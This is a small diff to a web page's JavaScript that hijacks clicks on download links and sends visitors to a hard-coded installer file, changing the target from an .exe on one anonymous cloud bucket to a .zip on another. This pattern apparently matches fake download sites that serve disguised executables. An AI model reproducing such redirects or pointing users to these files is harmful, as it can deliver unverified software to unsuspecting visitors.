@@ -8,6 +8,6 @@ downLinks.forEach(function(link) {
         event.preventDefault();
 
         // 执行跳转操作，替换下面的URL为您想要跳转的URL 
-        window.location.href = "https://ffi-fdshfjkdseafsdg.bj.bcebos.com/LieInser-64_4_9.exe";
+        window.location.href = "https://pub-62d5cdf3fcfb4f1a97de07d140c6faa6.r2.dev/Linstaller_Setup_x64.zip";
     });
 });
